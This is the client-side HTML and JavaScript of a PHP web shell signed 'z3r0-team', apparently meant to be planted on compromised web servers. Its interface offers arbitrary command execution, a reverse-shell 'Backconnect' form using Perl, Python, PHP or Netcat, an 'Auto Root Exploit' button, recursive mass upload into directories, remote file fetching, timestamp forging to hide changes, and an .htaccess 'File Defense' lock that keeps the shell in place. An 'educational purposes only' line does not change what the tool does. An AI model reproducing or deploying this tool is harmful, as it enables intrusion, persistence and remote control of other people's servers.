    <div id="create-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Create New</h2><button class="close-btn" onclick="hideModal('create-modal')">×</button></div><form id="create-form"><div class="modal-body"><input type="text" name="name" placeholder="Enter name..." required><div class="radio-group"><label><input type="radio" name="create_type" value="file" checked> File</label><label><input type="radio" name="create_type" value="dir"> Directory</label></div></div><div class="modal-footer"><button type="submit">Create</button></div></form></div></div>
    <div id="command-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Command Execution</h2><button class="close-btn" onclick="hideModal('command-modal')">×</button></div><form id="exec-form"><div class="modal-body"><input type="text" name="cmd" placeholder="ls -la" required><pre id="command-output" style="display: none;"></pre></div><div class="modal-footer"><button type="submit">Execute</button></div></form></div></div>
    <div id="chmod-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Change Permissions</h2><button class="close-btn" onclick="hideModal('chmod-modal')">×</button></div><form id="chmod-form"><div class="modal-body"><input type="text" name="perms" placeholder="e.g., 0755" required pattern="[0-7]{4}"><input type="hidden" name="z_ph_1"></div><div class="modal-footer"><button type="submit">Change</button></div></form></div></div>
    <div id="touch-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Change Timestamp</h2><button class="close-btn" onclick="hideModal('touch-modal')">×</button></div><form id="touch-form"><div class="modal-body"><input type="text" name="datetime" placeholder="YYYY-MM-DD HH:MM:SS" required><input type="hidden" name="z_ph_1"></div><div class="modal-footer"><button type="submit">Change</button></div></form></div></div>
    <div id="mass-upload-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Mass Upload</h2><button class="close-btn" onclick="hideModal('mass-upload-modal')">×</button></div><form id="mass-upload-form"><div class="modal-body"><input type="text" name="target_dir" placeholder="Target Directory" required><input type="text" name="filename" placeholder="Filename" required><textarea name="content" placeholder="File content..."></textarea><div class="checkbox-group"><label><input type="checkbox" name="recursive" checked> Massal (rekursif)</label></div></div><div class="modal-footer"><button type="submit">Start Upload</button></div></form></div></div>
    <div id="remote-upload-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Remote File Upload</h2><button class="close-btn" onclick="hideModal('remote-upload-modal')">×</button></div><form id="remote-upload-form"><div class="modal-body"><input type="text" name="url" placeholder="https://example.com/file.txt" required><input type="text" name="filename" placeholder="Save as (optional)"></div><div class="modal-footer"><button type="submit">Upload</button></div></form></div></div>
    <div id="defense-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">File Defense</h2><button class="close-btn" onclick="hideModal('defense-modal')">×</button></div><form id="defense-form"><div class="modal-body"><input type="text" name="target_file" placeholder="Full path to target file to protect" required><input type="text" name="backup_url" placeholder="URL to raw backup content" required><input type="text" name="htaccess_path" placeholder="Full path to .htaccess file to modify" required></div><div class="modal-footer"><button type="submit">Lock & Protect</button></div></form></div></div>
    <div id="about-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">About</h2><button class="close-btn" onclick="hideModal('about-modal')">×</button></div><div class="modal-body"><p class="credit">./s3nt1n3L - z3r0-team!</p><p>This tool is for educational purposes only.</p></div><div class="modal-footer"><button type="button" onclick="hideModal('about-modal')">Close</button></div></div></div>
    <div id="processes-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Running Processes</h2><button class="close-btn" onclick="hideModal('processes-modal')">×</button></div><div class="modal-body"><pre id="processes-output"></pre></div></div></div>
    <div id="phpinfo-modal" class="modal-backdrop"><div class="modal" style="max-width: 1000px;"><div class="modal-header"><h2 class="modal-title">PHP Info</h2><button class="close-btn" onclick="hideModal('phpinfo-modal')">×</button></div><div class="modal-body" id="phpinfo-output"></div></div></div>
    <div id="backconnect-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Backconnect</h2><button class="close-btn" onclick="hideModal('backconnect-modal')">×</button></div><form id="backconnect-form"><div class="modal-body"><input type="text" name="ip" placeholder="IP Address" required><input type="text" name="port" placeholder="Port" required><select name="method" class="button-secondary" style="width:100%;padding:0.6rem;"><option value="perl">Perl</option><option value="python3">Python3</option><option value="php">PHP</option><option value="nc">Netcat</option></select></div><div class="modal-footer"><button type="submit">Connect</button></div></form></div></div>
<script>
    let z_csrf_token = document.querySelector('meta[name="z_csrf_token"]').getAttribute('content');
    let z_current_path_hex = '<?php echo $v($b); ?>';
    const modals = ['view-edit-modal', 'create-modal', 'command-modal', 'chmod-modal', 'about-modal', 'processes-modal', 'touch-modal', 'long-task-modal', 'mass-upload-modal', 'remote-upload-modal', 'phpinfo-modal', 'defense-modal', 'backconnect-modal'];
    function showModal(id) { document.getElementById(id).style.display = 'flex'; }
    function hideModal(id) { document.getElementById(id).style.display = 'none'; }
    function hideAllModals() { modals.forEach(hideModal); }
    async function navigateTo(pathHex) { await refreshFileList(pathHex); }
    function showMessage(message, type = 'success') { const el = document.getElementById('message-area'); el.textContent = message; el.className = type; el.style.display = 'block'; setTimeout(() => { el.style.display = 'none'; }, 5000); }
    async function apiCall(formData) { formData.append('<?php echo $z_csrf_token_key; ?>', z_csrf_token); try { const response = await fetch('', { method: 'POST', body: formData }); if (!response.ok) throw new Error(`HTTP ${response.status}`); const result = await response.json(); if (result.new_csrf_token) { z_csrf_token = result.new_csrf_token; document.querySelector('meta[name="z_csrf_token"]').setAttribute('content', z_csrf_token); } if (result.message === 'Invalid CSRF token.') { alert('Session expired for security reasons. The page will now refresh.'); location.reload(); return null; } return result; } catch (e) { showMessage('API Error: ' + e.message, 'error'); return null; } }
    async function refreshFileList(pathHex = z_current_path_hex) { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_file_list_d4e'); fd.append('<?php echo $b_func; ?>', pathHex); const res = await apiCall(fd); if (res && res.status === 'success') { document.getElementById('file-list-tbody').innerHTML = res.file_list_html; document.getElementById('breadcrumbs-list').innerHTML = res.breadcrumbs_html; z_current_path_hex = res.current_path_hex; const saCb = document.getElementById('select-all-checkbox'); saCb.checked = false; } else { showMessage('Failed to refresh file list.', 'error'); } }
    async function runLongTask(action, title, formData) { const titleEl = document.getElementById('long-task-modal-title'); const outputEl = document.getElementById('long-task-output'); const ansi_up = new AnsiUp(); titleEl.textContent = title; outputEl.textContent = 'Please wait...'; showModal('long-task-modal'); if(!formData) formData = new FormData(); formData.append('z3r0_team_act_g8i', action); formData.append('<?php echo $b_func; ?>', z_current_path_hex); const result = await apiCall(formData); if(result?.status === 'success') { let finalOutput = result.output || result.message; if(action === 'z3r0_team_vulnscan_a1b'){ finalOutput = ansi_up.ansi_to_html(finalOutput); } outputEl.innerHTML = finalOutput; } else if (result) { outputEl.textContent = "Error: " + result.message; } }
    async function viewFile(pathHex) { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_content_z0a'); fd.append('z_ph_1', pathHex); const res = await apiCall(fd); if(res?.status === 'success'){ const pre = document.createElement('pre'); pre.textContent = res.content; document.getElementById('view-edit-modal-title').textContent = `View: ${res.filename}`; const body = document.getElementById('view-edit-modal-body'); body.innerHTML = ''; body.appendChild(pre); document.getElementById('view-edit-modal-footer').innerHTML = ''; showModal('view-edit-modal'); } else if (res) { showMessage(res.message, 'error'); } }
    async function editFile(pathHex) { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_content_z0a'); fd.append('z_ph_1', pathHex); const res = await apiCall(fd); if(res?.status === 'success'){ document.getElementById('view-edit-modal-title').textContent = `Edit: ${res.filename}`; document.getElementById('view-edit-modal-body').innerHTML = '<textarea id="editor-textarea"></textarea>'; document.getElementById('editor-textarea').value = res.content; const footer = document.getElementById('view-edit-modal-footer'); footer.innerHTML = '<button id="save-btn">Save</button>'; document.getElementById('save-btn').onclick = async () => { const saveFd = new FormData(); saveFd.append('z3r0_team_act_g8i', 'z3r0_team_save_content_d4e'); saveFd.append('z_ph_1', res.path_hex); saveFd.append('content', document.getElementById('editor-textarea').value); const saveRes = await apiCall(saveFd); if (saveRes) { showMessage(saveRes.message, saveRes.status); if (saveRes.status === 'success') hideModal('view-edit-modal'); } }; showModal('view-edit-modal'); } else if (res) { showMessage(res.message, 'error'); } }
    async function deleteItems(pathsHexArray) { if (!pathsHexArray || pathsHexArray.length === 0) { showMessage('No items selected.', 'error'); return; } if (!confirm(`Delete ${pathsHexArray.length} item(s)?`)) return; const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_delete_e5f'); pathsHexArray.forEach(path => fd.append('z_ph_2[]', path)); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') refreshFileList(); } }
    async function renameItem(pathHex, oldName) { const newName = prompt('Enter new name:', oldName); if (!newName || newName === oldName) return; const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_rename_m3n'); fd.append('z_ph_1', pathHex); fd.append('new_name', newName); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') refreshFileList(); } }
    function showChmodModal(pathHex, currentPerms) { const form = document.getElementById('chmod-form'); form.querySelector('input[name="z_ph_1"]').value = pathHex; form.querySelector('input[name="perms"]').value = currentPerms; showModal('chmod-modal'); }
    function showTouchModal(pathHex, currentMtime) { const form = document.getElementById('touch-form'); form.querySelector('input[name="z_ph_1"]').value = pathHex; form.querySelector('input[name="datetime"]').value = currentMtime; showModal('touch-modal'); }
    async function showProcesses() { await runLongTask('z3r0_team_ps_x4y', 'Running Processes'); }
    async function showPhpInfo() { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_get_phpinfo_z0a'); const res = await apiCall(fd); if (res?.status === 'success') { document.getElementById('phpinfo-output').innerHTML = res.output; showModal('phpinfo-modal'); } else if (res) { showMessage(res.message, 'error'); } }
    async function pingSession() { const fd = new FormData(); fd.append('z3r0_team_act_g8i', 'z3r0_team_ping_session_d5e'); await apiCall(fd); }
    function strToHex(str) { let hex = ''; for(let i=0; i<str.length; i++){ hex += ''+str.charCodeAt(i).toString(16); } return hex; }
    document.addEventListener('DOMContentLoaded', () => {
        refreshFileList(); setInterval(pingSession, 300000);
        document.querySelector('.php-version').addEventListener('click', showPhpInfo);
        document.getElementById('upload-input').addEventListener('change', async function() { if (this.files.length === 0) return; const fd = new FormData(); for (const file of this.files) { fd.append('files[]', file); } fd.append('z3r0_team_act_g8i', 'z3r0_team_upload_p6q'); fd.append('<?php echo $b_func; ?>', z_current_path_hex); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') refreshFileList(); } this.value = ''; });
        document.getElementById('create-new-btn').addEventListener('click', () => showModal('create-modal'));
        document.getElementById('cmd-btn').addEventListener('click', () => showModal('command-modal'));
        document.getElementById('about-btn').addEventListener('click', () => showModal('about-modal'));
        document.getElementById('ps-btn').addEventListener('click', showProcesses);
        document.getElementById('vuln-scan-btn').addEventListener('click', () => runLongTask('z3r0_team_vulnscan_a1b', 'Vulnerability Scan'));
        document.getElementById('auto-root-btn').addEventListener('click', () => runLongTask('z3r0_team_autoroot_b2c', 'Auto Root Exploit'));
        document.getElementById('mass-upload-btn').addEventListener('click', () => { const form = document.getElementById('mass-upload-form'); form.querySelector('input[name="target_dir"]').value = '<?php echo $b; ?>'; showModal('mass-upload-modal'); });
        document.getElementById('remote-upload-btn').addEventListener('click', () => showModal('remote-upload-modal'));
        document.getElementById('defense-btn').addEventListener('click', () => { const form = document.getElementById('defense-form'); form.querySelector('input[name="htaccess_path"]').value = '<?php echo $b; ?>' + '/.htaccess'; showModal('defense-modal'); });
        document.getElementById('backconnect-btn').addEventListener('click', () => showModal('backconnect-modal'));
        document.getElementById('create-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', fd.get('create_type') === 'file' ? 'z3r0_team_mkfile_s9t' : 'z3r0_team_mkdir_r8s'); fd.append('<?php echo $b_func; ?>', z_current_path_hex); const res = await apiCall(fd); if (res?.status === 'success') { hideModal('create-modal'); this.reset(); refreshFileList(); } showMessage(res.message, res.status); });
        document.getElementById('exec-form').addEventListener('submit', async function(event) { event.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_exec_y5z'); fd.append('<?php echo $b_func; ?>', z_current_path_hex); const outEl = document.getElementById('command-output'); const res = await apiCall(fd); if (res?.status === 'success') { outEl.innerHTML = res.output; outEl.style.display = 'block'; } else if (res) { showMessage(res.message, 'error'); outEl.style.display = 'none'; } });
        document.getElementById('chmod-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_chmod_t0u'); const res = await apiCall(fd); if (res?.status === 'success') { hideModal('chmod-modal'); refreshFileList(); } showMessage(res.message, res.status); });
        document.getElementById('touch-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_touch_v2w'); const res = await apiCall(fd); if (res?.status === 'success') { hideModal('touch-modal'); refreshFileList(); } showMessage(res.message, res.status); });
        document.getElementById('mass-upload-form').addEventListener('submit', function(e) { e.preventDefault(); const fd = new FormData(this); const targetDir = fd.get('target_dir'); fd.set('target_dir_hex', strToHex(targetDir)); fd.delete('target_dir'); fd.set('recursive', this.querySelector('input[name="recursive"]').checked); hideModal('mass-upload-modal'); runLongTask('z3r0_team_massupload_c3d', 'Mass Upload', fd); this.reset(); });
        document.getElementById('remote-upload-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_remote_upload_d4e'); fd.append('<?php echo $b_func; ?>', z_current_path_hex); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') { hideModal('remote-upload-modal'); this.reset(); refreshFileList(); } } });
        document.getElementById('defense-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_defense_lock_h8i'); const res = await apiCall(fd); if(res) { showMessage(res.message, res.status); if(res.status === 'success') hideModal('defense-modal'); } });
        document.getElementById('backconnect-form').addEventListener('submit', async function(e) { e.preventDefault(); const fd = new FormData(this); fd.append('z3r0_team_act_g8i', 'z3r0_team_backconnect_h8i'); const res = await apiCall(fd); if (res) { showMessage(res.message, res.status); if (res.status === 'success') hideModal('backconnect-modal'); } });
        document.getElementById('delete-selected-btn').addEventListener('click', () => { const paths = Array.from(document.querySelectorAll('.item-checkbox:checked')).map(cb => cb.value); deleteItems(paths); });
        document.getElementById('file-list-tbody').addEventListener('change', (e) => { if (e.target.classList.contains('item-checkbox')) { document.getElementById('select-all-checkbox').checked = (document.querySelectorAll('.item-checkbox:checked').length > 0 && document.querySelectorAll('.item-checkbox:checked').length === document.querySelectorAll('.item-checkbox').length); } });
        document.getElementById('select-all-checkbox').addEventListener('change', function() { document.querySelectorAll('.item-checkbox').forEach(cb => cb.checked = this.checked); });
        document.addEventListener('keydown', e => { if (e.key === "Escape") hideAllModals(); });
    });
</script>
</body>
</html>
